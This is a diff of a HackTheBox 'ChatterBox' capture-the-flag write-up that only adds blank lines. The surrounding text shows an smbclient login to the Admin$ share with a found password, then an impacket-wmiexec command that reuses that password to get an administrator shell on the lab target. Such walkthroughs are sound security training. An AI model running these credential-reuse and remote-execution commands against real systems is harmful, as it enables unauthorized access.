@@ -174,6 +174,7 @@ On our Kali machine we can check the status of port 445 with `netstat -ao | grep
 
 We can now start connecting to the SMB on the target through our localhost. 
 Lets try logging in to the `Admin$` share with 
+
 `smbclient -U 'Alfred%Welcome1!' //127.0.0.1/Admin$`
 
 ![admin-fail-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/admin-fail-17.png)
@@ -189,6 +190,7 @@ And weve only found this one password in our enumeration, worth a shot.
 
 
 That's it, they use the same password. From here we can use `wmiexec` to pop a shell as the admin. 
+
 `impacket-wmiexec Administrator:Welcome1\!@10.129.151.176`
 
 
